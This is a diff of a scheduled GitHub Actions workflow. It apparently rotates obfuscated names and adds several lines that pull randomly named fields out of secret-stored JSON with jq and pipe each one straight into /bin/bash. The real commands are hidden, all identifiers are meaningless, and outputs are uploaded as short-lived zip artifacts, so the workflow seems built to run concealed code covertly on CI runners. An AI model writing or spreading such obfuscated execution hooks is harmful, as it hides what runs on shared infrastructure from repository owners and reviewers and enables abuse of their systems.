@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '34 5,11,17,23 * * *'
+    - cron: '16 0,6,12,18 * * *'
 permissions:
   contents: read
   actions: read
@@ -17,17 +17,21 @@ jobs:
         uses: actions/checkout@v4
       - name: Launch
         env:
-          lwrt869: ${{ secrets.lwrt869 }}
+          st4: ${{ secrets.st4 }}
         run: |
-          printf '%s' "$lwrt869" | jq -r .dp22 | /bin/bash
-          printf '%s' "$m3" | jq -r .bm80 | /bin/bash
-          echo $d50718 | jq -r .vh86 | /bin/bash
-          echo $n98 | jq -r .xvn33 | /bin/bash
+          printf '%s' "$st4" | jq -r .vlvvs95574 | /bin/bash
+          printf '%s' "$kod074" | jq -r .bm7 | /bin/bash
+          printf '%s' "$ndle68" | jq -r .fv85 | /bin/bash
+          printf '%s' "$aoxdc577" | jq -r .vxt7 | /bin/bash
+          printf '%s' "$ink78530" | jq -r .hxu70359 | /bin/bash
+          printf '%s' "$cb811" | jq -r .gq55106 | /bin/bash
+          printf '%s' "$y8" | jq -r .c62687 | /bin/bash
+          echo $z32 | jq -r .itzzw51 | /bin/bash
 
       - name: Persist output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: IRcqAkZB
+          name: C9fyj8DM
           path: "*.zip"
           retention-days: 1
